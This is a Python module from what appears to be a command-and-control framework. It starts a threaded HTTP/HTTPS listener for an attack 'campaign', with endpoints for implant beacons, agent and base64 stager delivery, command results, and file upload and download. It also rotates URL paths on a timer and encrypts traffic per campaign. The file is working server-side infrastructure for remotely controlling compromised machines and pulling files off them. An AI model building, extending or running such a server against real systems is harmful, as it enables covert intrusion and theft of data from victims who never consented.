import socketserver
import threading
import os
import ssl
import json
import datetime
from core.crypto import KeyManager
from core.crypto import CryptoManager
from utils.client_identity import ClientVerifier
from utils.c2_handler import C2RequestHandler
from utils.path_rotation import PathRotationManager

class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """This server handles each request in a separate thread."""
    daemon_threads = True  # ensures threads exit when main thread does

# Global variable to hold the server instance
httpd = None

def start_webserver(ip, port, client_manager, logger, campaign_name=None, use_ssl=False, cert_path=None, key_path=None, url_paths=None, path_rotation=True, rotation_interval=3600):
    """Starts the web server in a separate thread."""
    global httpd
    try:
        # If campaign_name is not provided, try to determine it
        if not campaign_name:
            campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
            if campaign_dirs:
                campaign_name = campaign_dirs[0][:-9]  # Remove "_campaign" suffix
            else:
                campaign_name = "default_campaign"
        
        campaign_folder = f"{campaign_name}_campaign"
        
        # Create crypto manager for this campaign
        crypto_manager = CryptoManager(campaign_name)
        
        # Create client verifier for this campaign
        client_verifier = ClientVerifier(campaign_folder)
        
        # Load URL paths from file if not provided
        if url_paths is None:
            url_paths_file = os.path.join(campaign_folder, "url_paths.json")
            if os.path.exists(url_paths_file):
                try:
                    with open(url_paths_file, 'r') as f:
                        url_paths = json.load(f)
                    logger(f"Loaded custom URL paths from {url_paths_file}")
                except Exception as e:
                    logger(f"Error loading URL paths: {e}")
                    url_paths = {
                        "beacon_path": "/beacon",
                        "agent_path": "/raw_agent",
                        "stager_path": "/b64_stager",
                        "cmd_result_path": "/command_result",
                        "file_upload_path": "/file_upload",
                        "file_request_path": "/file_request"
                    }
            else:
                # Default URL paths
                url_paths = {
                    "beacon_path": "/beacon",
                    "agent_path": "/raw_agent",
                    "stager_path": "/b64_stager",
                    "cmd_result_path": "/command_result",
                    "file_upload_path": "/file_upload",
                    "file_request_path": "/file_request"
                }
        
        # Create path rotation manager
        path_manager = None
        if path_rotation:
            path_manager = PathRotationManager(
                campaign_folder, 
                logger, 
                initial_paths=url_paths,
                rotation_interval=rotation_interval
            )
            # Load existing state if available
            path_manager.load_state()
            logger(f"Path rotation enabled with interval {rotation_interval} seconds")
        
        # Create server with necessary attributes
        httpd = ThreadedHTTPServer((ip, port), C2RequestHandler)
        
        # Attach all necessary objects to server instance so handler can access them
        httpd.client_manager = client_manager
        httpd.logger_func = logger
        httpd.crypto_manager = crypto_manager
        httpd.campaign_name = campaign_name
        httpd.url_paths = url_paths
        
        # Attach the client verifier to the server
        httpd.client_verifier = client_verifier
        
        # Attach path rotation manager to the server if enabled
        if path_rotation:
            httpd.path_manager = path_manager
            httpd.path_rotation_interval = rotation_interval
        
        # Configure SSL if requested
        if use_ssl and cert_path and key_path:
            if os.path.exists(cert_path) and os.path.exists(key_path):
                try:
                    # Create SSL context
                    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                    ssl_context.load_cert_chain(certfile=cert_path, keyfile=key_path)
                    
                    # Wrap the socket with the SSL context
                    httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)
                    logger(f"SSL enabled with certificate {cert_path} and key {key_path}")
                except ssl.SSLError as e:
                    logger(f"SSL configuration failed: {e}")
                    raise
            else:
                logger("SSL certificate or key file not found, continuing without SSL")
        
        # Start the server in a separate thread
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True  # Allow the main program to exit even if the server is running
        server_thread.start()
        
        # Log server startup
        protocol = "https" if use_ssl and cert_path and key_path else "http"
        logger(f"Webserver started at {protocol}://{ip}:{port} for campaign '{campaign_name}'")
        logger(f"All traffic will be encrypted using AES-256-CBC with pre-shared keys")
        
        # Log path information
        if path_rotation:
            next_rotation = path_manager.get_next_rotation_time()
            current_paths = path_manager.get_current_paths()
            logger(f"Dynamic path rotation enabled - Current rotation ID: {path_manager.rotation_counter}")
            logger(f"Next path rotation scheduled at: {datetime.datetime.fromtimestamp(next_rotation).strftime('%Y-%m-%d %H:%M:%S')}")
            logger(f"Current URL paths: {current_paths}")
        else:
            logger(f"Using static URL paths: {url_paths}")
        
        # Create necessary campaign directories
        os.makedirs(os.path.join(campaign_folder, "uploads"), exist_ok=True)
        os.makedirs(os.path.join(campaign_folder, "agents"), exist_ok=True)
        os.makedirs(os.path.join(campaign_folder, "downloads"), exist_ok=True)
        
        return server_thread
    except Exception as e:
        logger(f"Error starting webserver: {e}")
        raise
    
def stop_webserver():
    """Stops the web server."""
    global httpd
    if httpd:
        httpd.shutdown()
        httpd.server_close()
        httpd = None